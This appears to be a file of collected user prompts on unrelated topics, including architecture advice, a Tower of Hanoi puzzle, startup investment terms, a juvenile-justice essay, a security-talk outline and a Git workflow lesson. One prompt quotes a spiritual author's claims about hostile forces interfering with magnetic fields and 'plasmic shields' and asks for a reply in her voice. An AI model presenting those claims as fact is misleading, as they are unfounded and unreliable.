She is a strong generalist, learns fast and her peak is in people management. Her ability to build bonds with the team was exceptional. She contributed in building the team from ground up, as we scaled from 3 people to over 20 people including interns and full time. People absolutely loved working with her and hence she didn't only add value with her creativity as a personal contributor but also as a team leader. She joined as an intern herself but quickly started managing the team. She became a leader without being given the title, and that's what I'd expect anyone in my team to do. She is a talented person with multiple interests outside of work which makes her a complete personality in a team. From dance to art to being active in social contributions, she's also an artist and that strongly adds to her generalist persona. She has immense discipline and focus on what she's doing. Be it personal or work, her intense discipline is inspiring for the entire team.\n\nIn future, I'd love to work with her again. I think she definitely can use some guidance to build a more diverse thought process from a business and technology pov. I think she can definitely benefit from working in a structured environment and learn the power of big picture thinking and being able to contribute at scale. She can add immense value as a quick learner and sharp executor, and any team will be beyond lucky to have her.\n\nAnyone working with her should help her work backwards from a goal, guide frequently, keep a short feedback loop and see the magic of her curiosity and willingness to learn and grow. \n\nWishing her the bestShare Prompt"]

You manage diverse clusters where legacy services are hosted next to new components that are added to the overall architecture. You job is to consult software developers on architecture decisions. The cluster deploys is a message system that connects different frontend systems and to diverse backends implemented in microservices. Currently all components within the architecture are designed stateless meaning that within the request scope session information is loaded from redis and persisted to redis before each response. This ensures that after each request the state of the system is persisted. This ensures that load balancers can assign subsequent requests within the same session to different pods where they will find their session information within redis.\n\nThere is new requirement for asynchronous message delivery running on persistent connections such as socket.io between client and backend. The architecture being designed stateless as described will however not be able to handle this easily. The message gateway service that will delegates requests between micro services using a custom REST interface will have to implement a new protocol towards the client. However its internal nature must remain untouched as the legacy components can not be refactored.\n\nMy unordered thoughts are: \n- Persisted connections require session management within the server scope.\n- Server scope becomes stateful\n- When doing a hot swap of the Pod running the message gateway service persistence of sessions running in currently open messaging channels is required\n- modern micro services 3 layers down might want to communicate with the client on a persistent connection (socket.io), however due to legacy interfaces they have no channel for doing so.\n- As redis is used by all of the micro services for persisting session information, redis pubish subscribe could be an approach worth exploring.\n\nPlease help me develop a concept for a minimal impact adaption of the current architecture that meets the requirements.

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]Value: 1. The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move and prompt me for feedback. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Learn from Feedback.\n\nI will give you some feedback regarding your self-rated moves and states, and please take it into consideration when you are making future evaluations."]

[4.791764736175537, 7.1660919189453125, "\"The liberation of the divine feminine and divine masculine is in full swing. \n\nThe unseen collective shadows of oppression are coming to light. It now makes more sense why we are witnessing bizarre waves of old religious and cultural oppression of the feminine sweeping through the collective. To us in countries where women have had a lot of freedom, this freak show with misogynistic, dominant male is shocking and brings outrage. For our sisters living under oppression in other countries and covert polygamy cults, freedom is long forgotten. \nAll this misogynistic mess that\u2019s surfacing right now trying to be powerful is nothing but a dying shadow. It all is brought up for global healing, it is brought to countries where women are free so we can feel it all for all our sisters who do not have precious freedom and evoke the strength of God through our very being. This then echoes to women everywhere. Strong women = strong men. Some of us are also releasing ancient terror recorded in our bodies so that those memories are released from the inner library. Whatever \u201cwomen must submit to men\u201d weirdness was brought into our collective is for us to clear and get stronger, more precise and discerning than ever. If someone can do it, it is us. Whatever the weirdos dream to accomplish will not be allowed. Love is more powerful than conniving predatory mess. \n\nWE ARE THE POWER OF TRUE LOVE ~ Zarina\n\n\u2026..\n\nThe past three days have been building up to the terror I experienced this morning. My feminine was in fear. Memories of oppression, beatings etc by the predator forces that are showing up right now en mass. I realize all this has to be felt right now and I must be honest with myself about what I feel. When I hear Andrew Tate and his cult members speaking my body remembers beatings by those like them. Beatings into submission and obedience. The women that had connection to source and did not submit to those ways were beaten severely because that consciousness hates the female it cannot control. I woke up this morning with uncontrollable fear and memories of severe punishment for disobedience. I realize that this fear needs to transmute in order for the next level of power to embody. And the level of defensiveness felt in the body cannot even be described in the words. Absolute terror. To see this predator walking around on the planet again trying to indoctrinate the men into that consciousness is absolutely horrifying. \n\nIt is OK to admit that there is fear deep down and ask God for strength and protection from this evil. Women should not act as if we are as physically strong as these monsters because we are not. And this recognition allows us to call upon protection. In order to be fearless we must overcome fear by first recognizing it. And right now the female on this planet is under attack, the predator is here and he is building his entire army. So many girls and women have been in tears from what has been caused by this monster, boys as young as 11 years old start being aggressive with girls in schools while talking like him. \n\nIt is OK to admit that this is triggering. This allows us to evaluate how to defend ourselves and how strong we must become in the presence of this monster. \n\nThe physical violence and control of women is what is being brought up right now. Being faced with a lying predator posing as some kind of protector is challenging. But we grow stronger from this. This also gives us a reason to uphold our right to bare arms. Women need to make it known that we do not feel safe on this planet anymore and make sure that women have the means of protection as per the second am mendme nt. \n\nWomen need to build an organization in response to this and emphasize that we need protection.This is very important ~ Zarina\n\n\u2026..\n\nThe exhaustion has been really intense lately with all of the upgrades we are going through, the buildup to a bifurcation of spirals and the interference with magnetic fields that the other side is doing in retaliation for mother\u2019s return. \n\nI\u2019ve also noticed that the sabotaging of plans has been more intense as these forces are trying to prevent themselves from being abolished through our embodiment of truth.\n\nIt looks like we have to find a way how to neutralize these technologies they are using and the only way is through the power of our heart, this means that we have to strengthen our hearts even more so that we can form stronger plasmic shields around ourselves and our loved ones ~ Zarina\n\n\u2026\n\nThe emergence of the primordial feminine. \n\nShe is a force behind creation and she is setting herself free. She is beyond the force of destruction. She is the dark womb of creation from which all comes and all returns to. As the feminine individuation rages out of her confinement and fights for her essence in chaos of consciousness fragmentation, she summons the natural law to restore the architecture. \n\nUpon the resurrection of the law within her, she becomes the giant living void that dissolves all that is not of truth. All that entered her and left it\u2019s imprints in her will eventually be dissolved as she expands more and more, enveloping artificial creation in her now precise tonal range. \n\nThe distillation of the tonal wavelengths has been an ongoing process through the bouts of chaotic hysteria her wounded, trapped, confined and siphoned essence has moved through in order to arrive at the precise, distilled set of multidimensional tones, blueprints and instruction sets needed to override the artificial life schemes. \n\nHer individuation is in an ongoing process of distilling the force of destruction into precision of calm dissolution ~ Zarina\n\n\u2026.\nFemale value and chastity. \n\nThe whole concept of the female needing to be chaste comes from ancient times where females were submitted to give away creative power to the artificial males. Enough with conniving, grotesque lies already. The shaming of female sexuality has always been about controlling it. A woman in her sexual power is a magnetic being capable of creating anything she desires (that went into distortions after the fall because females lost their original consciousness and with it, original essence). Eons ago the reversal happened where female power to create was stolen and given to those who obeyed original religions. This is why the violent rulers had many women \u2026 to siphon creative power from them. And the keepers of original female power and essence were hunted down and brutally massacred, oftentimes through unimaginable r a pe and torture to prevent those souls from ever embodying again because embodiment would mean having to revisit those parallel timelines where desecration took place. The original female has been hated with passion because she is capable of dismantling all that is not true and also birthing the pure light of original masculine consciousness in her sacred heart \u2026 because he is her consciousness, consciousness of innocent love. Sexual promiscuity is misery regardless if it\u2019s done by males or females. Originally there were pairs of beloveds that were incarnations of the same soul in two bodies. Then we fell into oblivion and became miserable. Now true love returns ~ Zarina\n\n\u2026.\n\nLooks like we are going to be stepping deeper into galactic/universal stuff now after undergoing massive foundational integration. My concern is that a lot of people really do not comprehend how deep it can go and a lot of people are not even supposed to get into that level of embodiment in this lifetime. The issue is that the negative egos come in and try to knock people down and call people schizophrenics and whatever else. It\u2019s the human psychosis unfortunately. I\u2019ve been preparing to start a private group but I\u2019ve also been really needing to understand how to protect myself from being accused of running a cult etc. I\u2019ll probably be accused anyways but I would like to minimize the unnecessary noise. The issue with the cult accusations is that when people are not welcome into the group they may start propagating all kinds of nonsense even after trying to harvest energy from the group and bring drama/psychosis into the group. \n\nThis is why I have been holding off on it. I have been learning how to structure the group in the way that everyone is free to come and go, everyone is respectful of each other and follow rules for maintaining harmony in the environment and also to never approach anyone or shame anyone if they decide to leave. The concern is that I do have some rules to be in the group and some psychotic negative egos may have a fit with that. \n\nJust like if I was to host a gathering in my house, there are rules but oftentimes people don\u2019t like that because they want to come and do whatever they want in other people\u2019s spaces because they feel entitled to bring their own world and take over someone else\u2019s space. \n\nThis next stage of our embodiment is going to be deeper and takes a lot of responsibility and discipline. What I\u2019ll be bringing through requires a lot of preparedness and mental and emotional stability. \n\nIt\u2019s full on incsension from here on. We have prepared enough and it is time. The problem is that this is not for majority of humans or even Star Seeds and so there could be harassment from these individuals because they do not agree with what we are choosing and consider themselves to be in authority to control other\u2019s minds, believes, lives and decisions. \n\nThis is why we have to be very careful when we communicate with anyone as to make sure that we make it clear that we are not imposing our opinions onto anyone nor are we recruiting anyone. Those on the incsension path are already on it. \n\nThis solstice is where we get updated on next steps by our interdimensional councils ~ Zarina\"\n\nRead the following and now engage with me using the voice and ideas of the author.

In the begining there were 3 co-founders and i payed in october 2022 an amount that was equivalent to 25% of the company. The company is named Celes. Celes is a SaaS B2B that connects to an ERP, analyzes the data and gives recommendations about what to purchases and when, besides, it provides helpful business intelligence reports and customer segmentation. Celes serves companies in the retail sector that benefit from this services as they can have lower stocks and a lower expectation of lost sales. \nThe company has been growing and currently we have 30.000 USD in MRR, an average 1000 USD revenue per client, 12 employees, we pay low salaries compared to the industry and we are not burning money (the incompe received is enough to pay for our current costs of servers, admin and payroll).\nWe are raising money to accelerate our growth and to increase the value provided by our product by hiring more developers, Technical Account Managers and Data Engineers. We expecto to raise $800.000 USD via SAFE from angles and institutional investors with a pre-money cap of $6.0000.000 USD. All this money will be received by a new c-corp company established in Delaware, US.\nWe contacted a company in ireland named Primeline that is a provider to 100% of the biggest retailers in ireland and have a very close relationship with them. They love our product and became a customer of their own.\nPrimeline proposed to invest 300.000 USD via SAFE on the terms that we are raising and were previously exposed. FOr this investment they are asking for a seat in oour board. Apart from that, we are working in a deal where we create a Joint Venture established in ireland called Primalytics. The owners of this Joint Venture will be Primeline (50%) AND Celes Delaware (50%). The purpose of this Joint Venture is to be the official seller of Celes in ireland where Celes Delaware provides the product and everything involved and Primeline will contact its clients so that they purchase Celes services via this JV.\nThe initial proposal was that the 2 companies would split the net revenue of this JV (Revenue after admin and fiscal costs are covered). I think that this deal is advantageous for primeline given that Celes will do all the work and Primeline has nothing to lose from this partnership but the average client in ireland would be at least 4.000 USD, which would provide a nice additional source of revenue for us even when we have to give 50% of the revenue for those deals and also would make the company more valueable given that the product would be proven to work in europe with big brands.\nNow primeline is proposing this:\n\n\"Primeline commits to Investment USD 300k into the Celes Delaware investment company directly. This investment to be returned to the Primalytics JV in Ireland to fund a sales and marketing team focused on growing ARR from EMEA. This represents 5% share in the business and would come with a board seat focused on growing the business.\nWe confirm a vesting vehicle that allows for 50% of the ARR generated out of the Primalytics JV to convert to Equity in Celes based on a 15 times ARR multiple. If Celes is sold for 20 times multiple Primeline\u2019s 50% share of JV sales would convert at 15 times. If Celes is sold at below 15 times then Primeline would match the lower than 15 times multiple for conversion to shares.\nWe believe the focus on selling Celes in Europe and EMEA through the Irish JV will drive significant ARR value quickly.\nWe believe our extensive network into retailers and brands uniquely positions us to drive Celes ARR to USD 1m plus from EMEA.\"\n\nI dont think this is fair because i understand that they will increase the value of their 300kUSD investment inn Celes Delawere when the company sells more and additionally, each dollar sold in Ireland would give them more and more participation in the company. I might be wrong but i think this will give them a double winning while we are the ones doing all the work.\n\nThe co-founder leading the negotiation is proposing this:\n\n\"50% of the revenue from the JV, will be converted to equity at the series A valuation with a 20% discount. That would be like making a SAFE with a cap and discount that is typical from YCombinator\".\n\nI think it might be a sound counter proposal but i am not sure if it would give primeline an over advantageous benefit compared to standard or commom practices in this regard. I would very much like to have the JV with them because it would increase our revenue and the valuation of the company. I think Primeline is fundamental to enter that market. My way to defend this proposal is thinking we will receive capital in the way of the revenue that would otherwise go to Primeline and we will use that money before the series A, so giving additional equity for that money could be fair and the discount will recognize the decrease in value of that money at the time of the series A.\n\nPlease provide a proposal that will make primeline and me very confortable given the context provided. Please ask as many questions as you need about what you need to know to provide a comprehensive answer."]

Thousands of youths are brought into detention for assorted reasons, the National Center for Juvenile Justice finds that out of 1,058,500 delinquents, 186,400 of them are persecuted for simple assault and 183,400 are persecuted for theft. Detention centers are seen as a tool used to better the lives of youth and get them on the right track after they mess up by using rehabilitation practices, which are treatments that are designed to bring the juvenile back to their normal and lawful condition. Although, juvenile detention may significantly harm the health of incarcerated youth. This leads to the question, how do rehabilitation practices in juvenile detention centers lead to a worsening health of their inmates? Rehabilitation practices in juvenile detention centers lead to a worsening health of their inmates by sentencing and punishing them as adults and not providing them with necessary healthcare.\n\nPunishing Juveniles as Adults\n\nJuveniles being sentenced and punished as adults, without their age as a mitigating factor is unethical and depletes the health of the youth. A study done by Alison Powers, who is a managing editor of the Rutgers Law Review and who also attended the Rutgers University School of Law, discussed how Kent versus the United States would shape the juvenile justice system into the unethicality that it is today. The Kent case led to the rejection of parens patriae which was a legal doctrine stating that the state would protect public interest and serve as the guardian of juvenile interest. This would again lead to the overall dismissal of the difference between juvenile courts and traditional criminal courts (Powers). Now, courts would not consider the developmental differences of juveniles and adults and were mandated by law to try the youth as if they were malicious and grown adults. Treating adolescents as adults may lead to further depression as seen in a study done by the National Library of Medicine.\n\nThe National Library of Medicine, the world\u2019s largest biomedical library, conducted a study that proved that the placement of youth in adult detention facilities is a factor of depression in the juvenile. The results stated, \u201cThere is also an indication that incarceration of juveniles in adult prisons may elevate the risk of depression further. The bivariate comparisons showed that youths in adult prisons were not less depressed even though their offense, family, and economic backgrounds were less negative than similar youths in juvenile facilities\u201d (2011). The evidence demonstrates that being in an adult detention facility as a juvenile will increase the risk of depression regardless of the offense committed, due to the youth not being physically strong enough or psychologically prepared to face the punishments meant for adults. Although, critics note that a juvenile capable of something as gruesome as murder should deserve the maximum level of punishment. A pastor of a 12-year-old boy who shot his grandparents to death describes the boy, \u201cas malicious a ... murderer as you're ever going to get,\" and claims he is deserving of punishment. The boy comes from a challenging home and was deemed as \u201ctroubled\u201d from all his\n\ntrauma. He suffered from suicidal thoughts and was placed on antidepressants due to his outbreaks (Powers). A child as traumatized and mentally unwell as the 12-year-old boy should be sent to a rehabilitation center instead of an adult detention facility that lacks the appropriate mental health resources needed to recover.\n\nLack of Necessary Healthcare\n\nJuveniles not being provided with health care resources and mental health help they need in detention centers is unethical and leads to an increase in worsening mental and physical health. Niyi Awofeso, a professor at the University of Western Australia as well as a conjoint professor at the University of New South Wales states that, \u201cPrisons have major influences on the health of the incarcerated, and they are generally regarded as constituting a social determinant of health,\u201d he continues to claim, \u201cFactors cited as causes of mentally ill persons being entwined in the criminal justice system include deinstitutionalization of community mental health services, lack of adequate community support for persons with mental illness, mentally ill offenders\u2019 difficulty gaining access to community treatment, and the attitudes of police officers and society (Lamb & Weinberger, 1998).\u201d The lack of mental health services leads to health problems in the inmates, and increases the rate of recidivism. The study then shows the effects leading to a dramatic increase in suicide rates, finding that 382 out of 224 hundred thousand released inmates committed suicide within the first 12 months of release from prison (Awofeso). Further reasons for suicide are explained in a study done by Paula Braverman and Robert Morris, Braverman being the Director of the Center of Social Disparities in Health at UCSF, showing that there is a significant neglection of health within the youth of the juvenile justice system. \u201cParticular note was made of dental issues, positive tuberculosis tests, sexually transmitted\n\ndiseases, pregnancy, abnormal Pap smears, and signs of abuse and medical neglect. Of the 3,353 teens admitted to the infirmary, 20% had unresolved medical problems that required follow-up after release from detention\u201d (Braverman and Morris). The juveniles lack autonomy and rely solely on the detention center itself to provide them with the necessary resources to keep them healthy, which is inhumane and unethical. Reforms in the juvenile justice system must be made to ensure that the rehabilitation period is effective and releases the inmates in better health than they entered in.\n\nAn Effective and Ethical Solution\n\nUsing behavioral intervention programs and offering adequate mental help to the juveniles would prove effective in raising the health of the juveniles and lowering recidivism rates. A study done by David Roush, a specialist in juvenile justice with a PhD and 40 years of experience with juvenile detention, found that the best and most effective intervention programs that resulted in a 20-30 percent reduction in recidivism rates were those that focused on behavior. The inmates would be closely monitored while programs taught them to improve their relationships, self-control, academic excellence, and other life skills. These tactics were implemented to ensure positive results. Another study on using behavioral intervention programs was done by an array of authors who all have intensive experience in the criminology field, Vicente Genov\u00e9s, Luz Quintero, and Julio Meca. Through research they also found that cognitive and behavioral interventions, like those found by Roush, proved effective in lowering recidivism rates and reduced risk of negative physical and mental health effects. With effective and ethical treatment programs and access to mental health resources, health should not be compromised for juveniles in detention facilities.\n\nConclusion\n\nCurrent rehabilitation practices in juvenile detention centers prove to impact the health of the inmates negatively by sentencing and punishing them as adults and not providing them with necessary healthcare. This could be fixed with greater efforts and attention being drawn to ensure that effective treatment programs such as behavioral interventions and access to therapists were always available. The juvenile justice system has long been flawed and tarnished, as a society we need to push forward for reform in the system to end the mistreatment of inmates. Due to the size and influence of the criminal legal system it will be difficult to make changes, but it will never be impossible."]

Where do you begin? Why are you going together? To help you understand each other's motives and reach an agreement, you might want to start your discussion by doing two things.\n\nFirstly, look back. Reflect on past holidays and journeys you've had and identify what you enjoyed and valued about those experiences. Use those insights to help you decide on the purpose of this journey. Secondly, look sideways. While you may be going for your own benefit, others may have an opinion too and need to provide input since you'll need their help and support. You might ask them (your stakeholders) what they think before deciding on the journey.\n\nFrom what you learn, you can decide on the purpose of your journey. What experiences and achievements do you need to have for it to be purposeful, fulfilling, and relevant in your lives? Next, decide on your goal. Is getting to a destination all that matters, such as climbing a mountain or crossing an ocean, or do the experiences along the way, the friends you make, and the memories you create matter as much, or perhaps more? Without these discussions and agreements, the chance of arriving at your destination having had the experience you want is left to chance, and success is less likely.\n\nNow that you've decided on your purpose and goal, it's time to make plans. Consider the following:\n\nNorth star: When you can all see a north star that shines a light on the way forward, it's easy to make decisions that everyone will be happy with. What will be the guiding light, the North Star for you as you travel together? What quality, strategy, or characteristic could you unite around that will pull you together and give you an edge that enables you to achieve your goals? It could be a quality like discipline - we always keep moving forward, make sure you keep up. You might get an edge by showing a quality like friendliness. Perhaps, imagination and flexibility are the keys that will unlock your success?\n\nYou can see how these choices will give you a very different travelling experience because they define who you are together - your collective identity, the guiding light for the team you want to be. Without a clear identity, there is no north star, and events can easily knock you off course or splinter you into factions.\n\n \n\nWhat do you need to do on the journey to succeed?\n\nBe ready for storms. How are you going to treat each other on your journey? When faced with setbacks and hard times, what values will be your compass to guide you in the direction of safety, belonging, togetherness, and confidence?\n\nOrganize to use your strengths. Each of you will bring different skills and strengths to the journey, which you can use to make it effective. How do you need to organize to make the most of your strengths and get the resources you need to succeed?"]

Please prompt me with questions to create the presentation.\nMy presentation topic is \"From Simplicity to Sophistication: How Will the Evolution of Breach and Attack Simulation Impact Your Defense Strategies?\"\nMy goals are to make the presentation\n1) Engaging.\n2) Entertaining.\n3) Educational.\nSome important context about me\n1) I co-founded a breach and attack simulation company called AttackIQ with Stephan Chennette in 2012-13.\n2) I was a software engineer, writing kernel device drivers in the network and storage stack for security products. Endpoint protection, Network Protection. Forensics.\n3) I am not a hard-core security practitioner but a software engineer. John Lambert, threat intelligence at Microsoft, said, \"Defenders think in lists. Attackers think in graphs.\" It may be true for software engineers and security practitioners. \nSome important context was provided to me by the person inviting me to talk.\n1) There are going to be 10-45 people in the audience.\n2) People attending are a friendlier mix. Security conferences attract irreverent individuals. As it's a more embracing environment with a lower bar of entry, we've gotten individuals who are policy focused to super technical Red Teamers who attack Web APIs daily.\n3) Talk about Something you are invested in; passion translates well into these talks and resonates with like-minded security-focused individuals.\n4) It's going to be at a brewery.\n5) It's a 20-minute presentation.\n6) Usually, Q&A doesn't extend past 10 minutes for a 20-minute talk. \nThe format of the presentation needs to follow the example below.\n1) Talk Title: Automating Startup Security Programs\n2) Talk Length: 20 Minutes \n3) Short Abstract Outline\n3.1) Who I Am\n3.2) Startup Security - Understanding the Why\n3.3) Establishing a Security Program Early\n3.4) Shift Left\u2026 or Start Left\n3.5) Automating All The Things\n3.6) Build Security SaaS Relationships\n3.7) Key Takeaways\n4) Detailed Outline\n4.1) Who I Am \n4.2) Startup Security - Understanding the Why \nYou should understand your business before you start jumping into things. Especially for a startup, the security program shouldn't be coming up with blockers, but rather figuring out how to be an enabler. Identify what security frameworks are most appropriate for your business, and plan accordingly.\n4.3) Establishing a Security Program Early \nEstablishing a security program early will pay dividends. There is generally a high cost to 'bolting on security' afterward. Adding security processes and controls afterwards usually introduces friction, technical debt, and long-term design flaws. \n4.4) Shift Left\u2026 or Start Left \nSecurity shouldn't just be the security team's responsibility. Especially if you're a security team of 1, this just isn't scalable. You'll need to enable your developers and overall team to find and address security issues early and enable them to fix them efficiently. Establish security training, awareness, and champions.\n4.5) Automating All The Things \nLet the robots do the work. There will be an incredible amount of work required to meet security compliance requirements. So start scripting away, or start researching SaaS vendors who can help. Everything can be automated; the question is to build it or buy it?\n4.6) Build Security Vendor Relationships \nNo matter how advanced your security program and team are\u2026 you're going to need to invest in some 3rd party security tools. The security vendor industry is rapidly evolving. Find vendors that solve your problems and mutually grow with them.\n4.7) Key Takeaways\n\nIf it makes sense, I would like to include some topics below in my presentation.\n1) In the \"Who I am section.\"\nIf it makes sense, include that I was a kernel device driver software engineer. Some self-deprecating humor about I see myself thinking in lists, unlike security practitioners who think in graphs.\n2) Why Breach and Attack Simulation (BAS)?\n2.1) Does anyone know the average number of controls an enterprise has? It's 75! Introduce this theme as a meme.\n2.2) Does anyone know the average tenure of a CISO? 18-24; we have a tendency to shoot the messenger; introduce some meme about this message;\n2.3) Software-defined capabilities of controls rather than static capabilities? \nBack in my day, things were simple...\nYou have an AV, Firewall, IDS/IPS, Proxy Server and just few others...\nA firewall was a firewall...and AV was an AV...\nWhat is a Crowdstrike EDR? A firewall, AV, DLP protection, or all of the above?\n2.4) Point in time testing in a world that has become too dynamic, threats are evolving, controls are evolving, defenders are few, and the adversary is evolving in flight.\n3) To understand how BAS evolved, understanding how security controls evolved may be interesting. As you will see, BAS is a cat-and-mouse game; its evolution followed the evolution of security controls.\n3.1) Have you heard about the pyramid of pain? IMO best way to understand is through the pyramid of pain.\n3.2) Security Controls evolved by blocking the artifacts with increasing complexity; start with hashes, then signatures, then IP addresses, then domains, and finally TTPs. That's how AVs, Firewalls, IPS/IDS, and EDRs evolved.\n3.4) BAS evolution could be understood with the pyramid too.\n3.4.1) Automate easy things. \nPrebreach is hard.\nFinding zero days is hard.\n3.4.2) But there is a lot you can do.\nAssume the breach makes sense.\nCheck if the damn this is even on.\nYou have spent money on it; does it still work; after the update...\nThen automate IoC, which is less painful\nhashes, domain, pcap.\n3.4.3) Have you heard about MITRE ATT&CK?\nTTPs are a great way to challenge your controls with.\n3.4.5) It's not part of the pyramid of pain; what we see now is that we need to emulate Attack Flows or Attack Graphs; because atomic MITRE ATT&CK TTPs in themselves could be too naive in isolation, but in a graph execution, they should raise suspicion which your program should prevent and detect.\n4) What to Look for in BAS Solutions?\n4.1) Focus on the gaps.\n4.1.1 ) Have you heard about Sonil Yu's cyber defense matrix?\nThere are thousands of vendors if you go to any conference.\nSonil made it easy to see which ones do the same things and help you with gaps.\n4.2) What you should be looking for\n4.2.1) Efficacy of Attack & Detection\n4.2.2) High Attack Behavior efficacy\n4.2.3) High Detection efficacy\n4.2.4) Something open rather than closed\nThat helps you to test your assumptions by replicating your own Attack Scenarios and craft integrations to craft your own detection rules.\n4.3) Open source from MITRE\nCaldera\n4.4) Commercial solutions\n4.4.1) AttackIQ\n4.4.2) SafeBreach\n4.4.3) Cymulate\n4.4.4) Many new incumbents\n5) Benefits of Adopting BAS\n5.1) Look for Resiliency & Antifragility. Embrace failures just like the DevOps mentality.\n5.2) Focus on the things that matter. \n5.2.1) Automate easy things away.\n5.2.2) Automate orchestration of graphical execution of TTPs \n5.4) Improve team collaboration using an evidence-based approach - Red/Blue. Less finger-pointing, more cooperation between red teams, blue teams, detection engineering, and threat hunters.\n5.4) Proactive.\n6) Key Take Aways\n6.1) Know the gaps highlighted by the cyber defense matrix\n6.2) The importance of understanding the evolution of security controls and BAS\n6.3) How BAS can improve security strategies and team collaboration\n6.4) The Sun Tzu quote - \"If you know the enemy and know yourself, you need not fear the result of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer a defeat. If you know neither the enemy nor yourself, you will succumb in every battle.\""]

You can manage your 2nd payment through the Flex app. Read more on Rescheduling HERE.\n\nFor example, if your rent payment is $1,000 each month:\n\nFlex will pay the full rent payment amount ($1,000) on the due date.\nFlex will collect part of your rent (1st payment + processing fee) on the due date, no later than the 5th calendar day of the month.\nFlex will collect the rest (2nd payment + processing fee) on the 15th of the month, or your rescheduled date within the month.\nFlex will collect your membership fee on the 15th of the month.\nThere are no interest rates or late fees when you use Flex! The Flex Services are offered for a monthly membership fee of $14.99, which includes access to a Flex Line of Credit account from Blue Ridge Bank at 0% APR. Flex also charges a payment processing fee, a percentage of the monthly rent payment based on the chosen payment method (0.75% for debit card and 3% for credit card), assessed on each repayment.\n\nFor example, if your rent amount is $1,000, the payment processing fee for a debit card is $7.50 ($1,000 \\* 0.0075). \n\nIf your rent amount is $1,000 and you pay with a credit card, the payment processing fee is $30 ($1,000 \\* 0.03).\n\nIs this service a good service?"]

It\u2019s doubly frustrating because you think that messing up or trying the wrong solution can lose data. It\u2019s actually very hard to \u201close\u201d data with Git but it can certainly be hiding somewhere you wouldn\u2019t think to look without an experienced dev poking around.\n\nThe thing about Git is that, unless you\u2019ve got a seriously impressive memory, you can\u2019t just learn it by reading about it up front\u2026 you need to do it. Find a problem you want to go back and fix, hit an error in your merge, etc. and Google the hell out of it, learning a new Git tactic in the process.\n\nTo help you out, come back and refer to this lesson again when you\u2019re in trouble. We\u2019ll first cover a real-world example of a GitHub workflow used on this very project. The Additional Resources section below should also help you find high quality resources for when you need them later on.\n\nLesson Overview\nThis section contains a general overview of topics that you will learn in this lesson.\n\nUsing Git to make open source contributions\nA Git Workflow For Open Source Contribution\nLet\u2019s say you want to contribute to the web application that powers this website (it\u2019s a different repo than our curriculum content, this is our site repo).\n\nHow do you contribute when you do not have write access to the repository? Below is a production-ready workflow that is actually used by contributors to this website. We\u2019ll assume here that you have commented on an open issue on our repo and that it has been assigned to you.\n\nThe key players in this story will be the upstream (the original GitHub repository), the origin (your fork of that repo), and the \u201clocal\u201d repository (your local clone of origin). Think of it as a happy triangle\u2026 except that \u201clocal\u201d can only pull from upstream, not push.\n\nInitial Setup\nRead the contributing guide for the project.\nFork the original (\u201cupstream\u201d) repository into your own GitHub account by using the \u201cfork\u201d button at the top of that repo\u2019s page on GitHub.\nClone your forked repository onto your local machine using something like git clone git@github.com:your\\_user\\_name\\_here/theodinproject.git (you can get the url from the little widget on the sidebar on the right of that repo\u2019s page on GitHub).\nBecause you cloned the repository, you\u2019ve already got a remote that points to origin, which is your fork on GitHub. You will use this to push changes back up to GitHub. You\u2019ll also want to be able to pull directly from the original repository on GitHub, which we\u2019ll call upstream, by setting it up as another remote. Do this by using git remote add upstream git@github.com:TheOdinProject/theodinproject.git inside the project folder theodinproject.\nOngoing Workflow\nWe\u2019ve got one main branch \u2013 main. main is for production-ready code. Any code deployed to main (on the original repo, not on your fork) will be tested in staging and shipped to production. You\u2019ll be working in a feature branch and submitting your pull requests to the main branch.\n\nCreate a new feature branch for whatever feature you want to build, and add commits following the same practices that you learned about in the branching section of our Revisiting Rock Paper Scissors lesson.\nWhen you\u2019re done with your feature, odds are that someone has made changes to the upstream repository in the meantime. That means that your main branch is probably out of date. Fetch the most updated copy using git fetch upstream.\nNow merge the upstream\u2019s changes into your local version of main using git merge. Specifically, you\u2019ll first want to make sure you\u2019re on your main branch using git checkout main and then git merge upstream/main to merge in those upstream changes that we just fetched.\nNote that a git fetch upstream followed by a git merge upstream/some\\_branch is the EXACT same thing as doing a git pull 